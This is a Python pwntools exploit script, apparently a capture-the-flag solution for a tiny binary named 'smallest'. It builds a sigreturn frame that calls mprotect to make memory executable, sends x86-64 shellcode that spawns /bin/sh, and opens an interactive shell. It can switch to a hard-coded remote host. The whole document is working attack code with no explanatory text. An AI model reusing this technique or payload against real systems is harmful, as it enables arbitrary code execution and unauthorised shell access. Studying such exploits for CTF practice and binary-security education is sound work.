from pwn import *

context.arch = "amd64"
DEBUG = 1
if DEBUG:
    p = process('./smallest')
else:
    p = remote('106.75.61.55',  20000)

shellcode =""
shellcode += "\x31\xf6\x48\xbb\x2f\x62\x69\x6e"
shellcode += "\x2f\x2f\x73\x68\x56\x53\x54\x5f"
shellcode += "\x6a\x3b\x58\x31\xd2\x0f\x05"

##mprotect sigreturn frame
frame1 = SigreturnFrame()
frame1.rax = 0xa
frame1.rdi = 0x00400000
frame1.rsi = 0x1000
frame1.rdx = 7
frame1.rsp = 0x400018   ##key
frame1.rip = 0x4000Be

syscall_ret=0x4000BE

def pwn():
    #gdb.attach(p,'b *0x00000000004000b0')
    payload=p64(0x00000000004000B0)
    payload+='a'*8
    payload+=bytes(frame1)
    #print payload
    p.sendline(payload)
    raw_input()
    payload=p64(0x4000BE)+bytes(frame1)[:7]
    p.send(payload)
    sleep(4)
    raw_input()
    p.send(p64(0x400028)+shellcode+'\n')
    #p.sendline(payload)

    p.interactive()

if __name__ == '__main__':
    pwn() 


#\xB0\x00\x40\x00\x00\x00\x00\x00
#b *0x00000000004000B0
#rsp=0x7fffffffe3c0
